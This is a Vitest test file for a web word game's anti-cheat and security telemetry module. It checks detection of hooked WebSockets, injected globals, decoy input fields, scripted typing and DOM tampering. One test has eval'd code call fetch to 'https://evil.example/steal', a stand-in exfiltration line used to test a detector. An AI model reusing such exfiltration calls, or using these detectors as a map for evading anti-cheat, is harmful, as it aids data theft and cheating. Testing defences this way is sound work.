import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { EVENT, SOCKET_DEBUG, fitJson, foreignStack, toMetric } from './report.js';
import { createEnvironment } from './environment.js';
import { createFieldGuard } from './fieldGuard.js';
import { createSecurity } from './index.js';
import { defaultNative } from './native.js';

afterEach(() => {
	vi.useRealTimers();
	document.body.innerHTML = '';
});

describe('report: the wire format', () => {
	it('knows the 18 event codes of the server (SecurityTelemetryPolicy.ts) and the debug channel', () => {
		expect(Object.entries(EVENT).sort((a, b) => a[1] - b[1]).map(([k]) => k)).toEqual(['Bengal', 'ScottishFold', 'Persian', 'Birman', 'MaineCoon', 'Lykoi', 'Ocicat', 'TurkishAngora', 'DOMManipulation', 'ProtectionBypassed', 'SuspiciousAccess', 'CriticalDOM', 'AttributeModified', 'FakeFocus', 'Chartreux', 'LaPerm', 'Siamese', 'NorwegianForest']);
		expect(SOCKET_DEBUG).toBe(32001);
	});

	it('builds a metric the server accepts: <= 16 keys, strings <= 2048, finite numbers, `type` renamed, `action` dropped', () => {
		const m = toMetric({ action: 'x', type: 'real_input_removed', a: 'x'.repeat(5000), n: 5, big: 9e12, nan: NaN, flag: true, obj: {}, 'bad key': 1 });
		expect(m).toEqual({ inputType: 'real_input_removed', a: 'x'.repeat(2048), n: 5, big: 1_000_000_000, flag: true });
		expect(Object.keys(toMetric(Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`k${i}`, i])))).length).toBe(16);
	});

	it('fits a history into one metric string by dropping the oldest entries', () => {
		const items = Array.from({ length: 200 }, (_, i) => ({ time: `${i}`, type: 'insertText', data: 'a', result: 'abc'.repeat(10) }));
		const text = fitJson(items);
		expect(text.length).toBeLessThanOrEqual(2048);
		const kept = JSON.parse(text);
		expect(kept.at(-1).time).toBe('199');
	});

	it('tells code that is not the page\'s (extension, user script, console, eval) from built-in frames', () => {
		expect(foreignStack('Error\n at f (chrome-extension://abc/content.js:1:1)')).toBe(true);
		expect(foreignStack('Error\n at f (moz-extension://abc/x.js:1:1)')).toBe(true);
		expect(foreignStack('Error\n at <anonymous>:1:7')).toBe(true);
		expect(foreignStack('Error\n at eval (eval at <anonymous> (https://kkutu.io/a.js:1:1), <anonymous>:1:1)')).toBe(true);
		expect(foreignStack('Error\n at new Promise (<anonymous>)\n at Array.map (<anonymous>)\n at x (https://kkutu.io/_app/immutable/chunks/a.js:3:4)')).toBe(false);
	});
});

describe('environment: init token and the server challenges', () => {
	const env = (extra = {}) => {
		const calls = [];
		const e = createEnvironment({ report: (a, d) => calls.push([a, d]), lastType: () => 'talk', lastRelay: () => '가위', native: { ...defaultNative, ...extra } });
		return { e, calls };
	};

	it('sends a Chartreux init token that passes the server check (not a multiple of 1051)', () => {
		const { e, calls } = env();
		for (let i = 0; i < 300; i++) e.sendInit();
		for (const [action, data] of calls) {
			expect(action).toBe('Chartreux');
			expect(data.init).toMatch(/^[0-9a-f]{8}$/);
			expect(parseInt(data.init, 16) % 1051).not.toBe(0);
		}
	});

	it('sends a failing token when WebSocket.send was renamed by a hand-made wrapper (and when asked to)', () => {
		const { e, calls } = env({ nativeSend: Object.defineProperty(function () {}, 'name', { value: 'hooked' }), NativeWebSocket: class WebSocket { close() {} } });
		for (let i = 0; i < 50; i++) e.sendInit();
		// jsdom's close() is named "close", so the rename check applies
		expect(calls.every(([, d]) => parseInt(d.init, 16) % 1051 === 0)).toBe(true);
		const forced = env();
		forced.e.sendInit(true);
		expect(parseInt(forced.calls[0][1].init, 16) % 1051).toBe(0);
	});

	it('answers the heartbeat (test 127) with LaPerm + the last message type, and the last-word request (test 0) with Siamese', () => {
		const { e, calls } = env();
		expect(e.answerTest({ type: 'test', reqType: 127 })).toBe(true);
		expect(e.answerTest({ type: 'test', reqType: 0 })).toBe(true);
		expect(e.answerTest({ type: 'welcome' })).toBe(false);
		expect(calls).toEqual([['LaPerm', { lastType: 'talk' }], ['Siamese', { lastRelay: '가위' }]]);
	});
});

describe('environment: the page watchers', () => {
	beforeEach(() => vi.useFakeTimers());
	const start = (native) => {
		const calls = [];
		const e = createEnvironment({ report: (a, d) => calls.push([a, d]), lastType: () => '', lastRelay: () => '', native: { ...defaultNative, isNative: () => true, ...native } });
		e.start();
		return { e, calls };
	};

	it('Bengal: window.WebSocket or its send is not the one the page started with', async () => {
		class Mine {}
		const send = () => {};
		const { e, calls } = start({ NativeWebSocket: Mine, nativeSend: send });
		await vi.advanceTimersByTimeAsync(6000);
		expect(calls.some(([a]) => a === 'Bengal')).toBe(true); // jsdom's WebSocket is not "Mine"
		e.stop();
		const quiet = start({ NativeWebSocket: window.WebSocket, nativeSend: window.WebSocket.prototype.send });
		await vi.advanceTimersByTimeAsync(6000);
		expect(quiet.calls.filter(([a]) => a === 'Bengal')).toEqual([]);
		quiet.e.stop();
	});

	it('TurkishAngora: a window property that appears is reported, one on the ignore list is not', async () => {
		const { e, calls } = start({});
		await vi.advanceTimersByTimeAsync(3000); // the baseline is taken when the watchers wake up
		window.cheatHelper = 1;
		window.google_ads_thing = 1;
		await vi.advanceTimersByTimeAsync(10_000);
		const hit = calls.find(([a]) => a === 'TurkishAngora');
		expect(hit).toBeTruthy();
		expect(JSON.parse(hit[1].added)).toEqual(['cheatHelper']);
		expect(hit[1].modCount).toBe(1);
		delete window.cheatHelper;
		delete window.google_ads_thing;
		e.stop();
	});

	it('TurkishAngora: globals the page\'s own ad, error-tracking and framework scripts add are not reported', async () => {
		const { e, calls } = start({});
		await vi.advanceTimersByTimeAsync(3000);
		const own = ['GoogleGcLKhOms', 'googFloatingToolbarManagerAsyncPositionUpdate', 'ggeac', 'AFMA_Communicator', 'ampInaboxIframes', 'adsbygoogle', 'Sentry', '__SENTRY__', '__svelte', '__sveltekit_abc123'];
		for (const n of own) window[n] = 1;
		await vi.advanceTimersByTimeAsync(10_000);
		expect(calls.filter(([a]) => a === 'TurkishAngora')).toEqual([]);
		for (const n of own) delete window[n];
		e.stop();
	});

	it('TurkishAngora: the lists stay valid JSON however many properties changed (the server parses them)', async () => {
		const { e, calls } = start({});
		await vi.advanceTimersByTimeAsync(3000);
		const names = Array.from({ length: 300 }, (_, i) => `injectedGlobal${i}`);
		for (const n of names) window[n] = 1;
		await vi.advanceTimersByTimeAsync(10_000);
		const hit = calls.find(([a]) => a === 'TurkishAngora')[1];
		const added = JSON.parse(hit.added);
		expect(hit.added.length).toBeLessThanOrEqual(1000);
		expect(added.length).toBeGreaterThan(10);
		expect(JSON.parse(hit.removed)).toEqual([]);
		expect(hit.modCount).toBe(300);
		for (const n of names) delete window[n];
		e.stop();
	});

	it('Ocicat: a fetch from the console / eval / an extension is reported, the page\'s own is not', async () => {
		const fake = vi.fn(() => Promise.resolve());
		window.fetch = fake;
		const { e, calls } = start({ nativeFetch: fake });
		await vi.advanceTimersByTimeAsync(3100);
		expect(window.fetch).not.toBe(fake); // wrapped
		window.fetch('/api/play/1/ticket'); // from this file: the page's own
		expect(calls.filter(([a]) => a === 'Ocicat')).toEqual([]);
		new Function('f', 'return f("https://evil.example/steal")')(window.fetch); // eval'd code
		expect(calls.find(([a]) => a === 'Ocicat')?.[1]).toEqual({ uri: 'https://evil.example/steal' });
		expect(fake).toHaveBeenCalledTimes(2); // the requests went through either way
		e.stop();
		expect(window.fetch).toBe(fake); // and stopping puts the original back
		delete window.fetch;
	});

	it('ScottishFold: a dialog opened by code that is not the page\'s', async () => {
		if (typeof HTMLDialogElement === 'undefined') return;
		const proto = HTMLDialogElement.prototype;
		const had = Object.getOwnPropertyDescriptor(proto, 'showModal');
		proto.showModal = function () {};
		const { e, calls } = start({});
		await vi.advanceTimersByTimeAsync(3100);
		const dialog = document.createElement('dialog');
		dialog.id = 'x';
		dialog.showModal(); // from this file
		expect(calls.filter(([a]) => a === 'ScottishFold')).toEqual([]);
		new Function('d', 'd.showModal()')(dialog);
		expect(calls.find(([a]) => a === 'ScottishFold')?.[1]).toEqual({ elementId: '["x"]' });
		e.stop();
		if (had) Object.defineProperty(proto, 'showModal', had);
		else delete proto.showModal;
	});

	it('Birman: a content-security-policy violation', () => {
		const { e, calls } = start({});
		const ev = new Event('securitypolicyviolation');
		Object.defineProperty(ev, 'violatedDirective', { value: 'script-src' });
		document.dispatchEvent(ev);
		expect(calls).toEqual([['Birman', { cspType: 'script-src' }]]);
		e.stop();
	});
});

describe('the facade', () => {
	it('sends securityTelemetry packets, repeats a detection at most once a second, never holds back an answer to the server', () => {
		let t = 1000;
		const sent = [];
		const s = createSecurity({ send: (type, data) => sent.push([type, data]), now: () => t, lastType: () => 'talk' });
		s.report('Lykoi', { data: 'abc', inputType: 'insertText' });
		s.report('Lykoi', {});
		expect(sent).toEqual([['securityTelemetry', { eventCode: 6, metric: { data: 'abc', inputType: 'insertText' } }]]);
		t += 1001;
		s.report('Lykoi', {});
		expect(sent).toHaveLength(2);
		s.answerTest({ type: 'test', reqType: 127 });
		s.answerTest({ type: 'test', reqType: 127 });
		expect(sent.filter(([, d]) => d.eventCode === 16)).toHaveLength(2);
		s.report('NoSuchEvent');
		expect(sent).toHaveLength(4);
	});

	it('sends the socket debug events on the 32001 channel', () => {
		const sent = [];
		const s = createSecurity({ send: (type, data) => sent.push(data), lastType: () => 'ping', debugContext: () => ({ roomId: 5, masterState: 1, slaveState: 3 }) });
		s.debug('slave-close', { code: 1006, reason: '', wasClean: false });
		expect(sent[0].eventCode).toBe(32001);
		expect(sent[0].metric).toMatchObject({ event: 'slave-close', code: 1006, wasClean: false, roomId: 5, masterState: 1, slaveState: 3, lastType: 'ping', online: true });
	});
});

describe('field guard', () => {
	beforeEach(() => vi.useFakeTimers());
	function setup({ gaming = true, decoys = false, native = defaultNative, admin = false } = {}) {
		const calls = [];
		let clock = 1_000_000;
		const guard = createFieldGuard({ report: (a, d) => calls.push([a, d]), native, now: () => clock });
		const box = document.createElement('div');
		const el = document.createElement('input');
		el.id = 'real';
		el.placeholder = '여기에 입력하세요.';
		box.append(el);
		document.body.append(box);
		const handle = guard(el, { isGaming: () => gaming, decoys, admin });
		const input = (name, init, value) => {
			if (value !== undefined) defaultNative.writeValue(el, value);
			const ev = new InputEvent(name, { inputType: 'insertText', cancelable: true, bubbles: true, ...init });
			el.dispatchEvent(ev);
			return ev;
		};
		return { el, box, calls, handle, input, tick: (ms) => (clock += ms), actions: () => calls.map(([a]) => a) };
	}

	it('Lykoi: cancels a paste, undo/redo, replacement and a word inserted in one piece during a game, and reports it', () => {
		const t = setup();
		for (const inputType of ['insertFromPaste', 'historyUndo', 'historyRedo', 'insertReplacementText']) {
			t.tick(2500);
			expect(t.input('beforeinput', { inputType }).defaultPrevented, inputType).toBe(true);
		}
		t.tick(2500);
		expect(t.input('beforeinput', { inputType: 'insertText', data: '위병소' }).defaultPrevented).toBe(true);
		expect(t.actions().filter((a) => a === 'Lykoi')).toHaveLength(5);
		t.tick(2500);
		expect(t.input('beforeinput', { inputType: 'insertText', data: '가' }).defaultPrevented).toBe(false); // an ordinary key
		t.tick(2500);
		expect(t.input('beforeinput', { inputType: 'insertText', data: '위병', isComposing: true }).defaultPrevented).toBe(false); // composing is judged elsewhere
	});

	it('Lykoi: reports at most once in two seconds, only reports during a game, and leaves administrators alone', () => {
		const t = setup();
		t.input('beforeinput', { inputType: 'insertFromPaste' });
		t.input('beforeinput', { inputType: 'insertFromPaste' }); // cancelled again, reported once
		expect(t.actions()).toEqual(['Lykoi']);
		const idle = setup({ gaming: false });
		expect(idle.input('beforeinput', { inputType: 'insertFromPaste' }).defaultPrevented).toBe(false);
		expect(idle.actions()).toEqual([]);
		const admin = setup({ admin: true });
		expect(admin.input('beforeinput', { inputType: 'insertFromPaste' }).defaultPrevented).toBe(false);
	});

	it('Lykoi: an IME composition that suddenly adds several characters is cancelled; a normal one is not', () => {
		const t = setup();
		t.input('beforeinput', { inputType: 'insertCompositionText', data: '위', isComposing: true });
		t.input('input', { inputType: 'insertCompositionText', data: '위', isComposing: true }, '위');
		t.tick(100);
		expect(t.input('beforeinput', { inputType: 'insertCompositionText', data: '위병', isComposing: true }).defaultPrevented).toBe(false);
		t.input('input', { inputType: 'insertCompositionText', data: '위병', isComposing: true }, '위병');
		t.tick(2500);
		expect(t.input('beforeinput', { inputType: 'insertCompositionText', data: '위병소사랑', isComposing: true }).defaultPrevented).toBe(true);
		expect(t.calls.find(([a]) => a === 'Lykoi')[1].pre).toBe('위병');
	});

	it('MaineCoon: more than three Hangul/digit characters within 0.1 s, with the input history attached', async () => {
		const t = setup();
		t.input('input', { inputType: 'insertText', data: '가' }, '가');
		await vi.advanceTimersByTimeAsync(100);
		expect(t.actions()).not.toContain('MaineCoon');
		defaultNative.writeValue(t.el, '가나다라마바'); // a script sets the whole word
		await vi.advanceTimersByTimeAsync(100);
		const hit = t.calls.find(([a]) => a === 'MaineCoon');
		expect(hit).toBeTruthy();
		expect(JSON.parse(hit[1].intervalInputHistory).at(-1)).toBe('>>DETECTED<<');
		expect(JSON.parse(hit[1].onInputHistory).at(-1).type).toBe('>>DETECTED<<');
		// Latin letters are not counted (legacy filter: Hangul and digits only)
		t.calls.length = 0;
		defaultNative.writeValue(t.el, 'abcdefghij');
		await vi.advanceTimersByTimeAsync(300);
		expect(t.actions()).toEqual([]);
	});

	it('puts 10-30 decoys on each side of an answer field, built like the legacy ones, and takes them away again', () => {
		const t = setup({ decoys: true });
		const all = [...t.box.querySelectorAll('input')];
		const decoys = all.filter((i) => i !== t.el);
		expect(decoys.length).toBeGreaterThanOrEqual(20);
		expect(decoys.length).toBeLessThanOrEqual(60);
		const before = all.indexOf(t.el);
		expect(before).toBeGreaterThanOrEqual(10);
		expect(decoys.length - before).toBeGreaterThanOrEqual(10);
		for (const d of decoys) {
			expect(d.getAttribute('maxlength')).toBe('180');
			expect(d.getAttribute('autocomplete')).toBe('off');
			expect(d.getAttribute('aria-hidden')).toBe('true'); // screen readers skip them
			expect(d.tabIndex).toBe(-1);
			expect(d.offsetWidth).toBe(0); // as far as a page script can measure
			expect(d.id).toMatch(/^ClientMessage/);
		}
		expect(t.el.getAttribute('maxlength')).toBeNull(); // the real field is not shaped like a decoy
		t.handle.destroy();
		expect(t.box.querySelectorAll('input').length).toBe(1);
	});

	it('decoys carry the real field\'s placeholder (a bot that looks the field up by it meets decoys) but stay hidden from assistive technology', () => {
		const t = setup({ decoys: true });
		const decoys = [...t.box.querySelectorAll('input')].filter((i) => i !== t.el);
		expect(decoys.every((d) => d.placeholder === '여기에 입력하세요.' && d.getAttribute('aria-hidden') === 'true')).toBe(true);
	});

	it('FakeFocus: any input, key or paste event on a decoy, even without focusing it (a script can fill one silently)', () => {
		const t = setup({ decoys: true });
		const decoy = [...t.box.querySelectorAll('input')].find((i) => i !== t.el);
		for (const [i, ev] of [new Event('input'), new InputEvent('beforeinput'), new KeyboardEvent('keydown', { key: 'a' }), new Event('paste'), new Event('change')].entries()) {
			t.tick(1100 * (i + 1)); // (the facade's cooldown is not part of the guard)
			t.calls.length = 0;
			decoy.dispatchEvent(ev);
			expect(t.calls, ev.type).toEqual([['FakeFocus', { fakeId: decoy.id, realId: 'real' }]]);
		}
		// the page's own refilling of decoys (a native write, no event) stays silent
		t.calls.length = 0;
		defaultNative.writeValue(decoy, 'filled by the page');
		expect(t.calls).toEqual([]);
	});

	it('FakeFocus: a decoy that takes the focus', () => {
		const t = setup({ decoys: true });
		const decoy = [...t.box.querySelectorAll('input')].find((i) => i !== t.el);
		decoy.dispatchEvent(new FocusEvent('focusin', { bubbles: true }));
		expect(t.calls.find(([a]) => a === 'FakeFocus')?.[1]).toMatchObject({ fakeId: decoy.id, realId: 'real' });
		t.calls.length = 0;
		t.el.dispatchEvent(new FocusEvent('focusin', { bubbles: true }));
		expect(t.calls).toEqual([]);
	});

	it('Persian: a stray input shaped like a decoy that has text in it', async () => {
		const t = setup({ decoys: true });
		const clone = document.createElement('input');
		clone.maxLength = 180;
		clone.autocomplete = 'off';
		t.box.append(clone);
		await vi.advanceTimersByTimeAsync(2000);
		expect(t.actions()).not.toContain('Persian'); // empty
		defaultNative.writeValue(clone, '정답입니다');
		await vi.advanceTimersByTimeAsync(2000);
		const hit = t.calls.find(([a]) => a === 'Persian');
		expect(hit?.[1]).toMatchObject({ inputVal: '정답입니다' });
		expect(hit[1].intervalInputHistory).toBeTypeOf('string');
		// the page's own decoys, which do hold text, are never reported
		expect(t.calls.filter(([a]) => a === 'Persian')).toHaveLength(1);
	});

	it('ProtectionBypassed: a decoy that is no longer hidden', async () => {
		const t = setup({ decoys: true, native: { ...defaultNative, sizeOf: (el) => (el.id.startsWith('ClientMessage') ? { width: 80, height: 20 } : { width: 0, height: 0 }) } });
		await vi.advanceTimersByTimeAsync(2000);
		expect(t.actions()).toContain('ProtectionBypassed');
	});

	it('DOMManipulation / CriticalDOM: the real field vanishes without the page taking it away; a normal removal is silent', async () => {
		const gone = setup({ decoys: true });
		gone.el.remove();
		await vi.advanceTimersByTimeAsync(0);
		await vi.advanceTimersByTimeAsync(2100);
		expect(gone.actions()).toEqual(expect.arrayContaining(['CriticalDOM', 'DOMManipulation']));
		expect(gone.calls.find(([a]) => a === 'CriticalDOM')[1]).toEqual({ type: 'real_input_removed' });
		gone.handle.destroy();

		const normal = setup({ decoys: true });
		normal.handle.destroy(); // what the page's own teardown does first
		normal.box.remove();
		await vi.advanceTimersByTimeAsync(3000);
		expect(normal.actions()).toEqual([]);

		// removed together with its container
		const parent = setup({});
		parent.box.remove();
		await vi.advanceTimersByTimeAsync(3000);
		expect(parent.actions()).toContain('CriticalDOM');
	});

	it('AttributeModified: id, style or class of the real field changed', async () => {
		const t = setup({ decoys: true });
		t.el.setAttribute('style', 'display:none');
		await vi.advanceTimersByTimeAsync(0);
		expect(t.calls.find(([a]) => a === 'AttributeModified')?.[1]).toEqual({ attr: 'style', newVal: 'display:none' });
		t.calls.length = 0;
		t.el.setAttribute('aria-label', 'x'); // other attributes are the page's business
		await vi.advanceTimersByTimeAsync(0);
		expect(t.calls).toEqual([]);
	});

	it('SuspiciousAccess: the value is set from outside the page more than ten times; the page\'s own writes are not counted', () => {
		const t = setup({ decoys: true });
		for (let i = 0; i < 30; i++) {
			t.tick(150);
			t.el.value = `page ${i}`; // from this file: the page
		}
		expect(t.actions()).not.toContain('SuspiciousAccess');
		expect(t.el.value).toBe('page 29'); // reads and writes still work
		for (let i = 0; i < 12; i++) {
			t.tick(150);
			new Function('el', 'v', 'el.value = v')(t.el, `bot ${i}`);
		}
		const hit = t.calls.find(([a]) => a === 'SuspiciousAccess');
		expect(hit?.[1].count).toBe(11);
		expect(t.el.value).toBe('bot 11');
	});

	it('reads the value through the browser\'s own getter, whatever the field says about itself', () => {
		const t = setup({ decoys: false });
		Object.defineProperty(t.el, 'value', { get: () => 'spoofed', configurable: true });
		defaultNative.writeValue(t.el, 'truth');
		expect(defaultNative.readValue(t.el)).toBe('truth');
	});
});
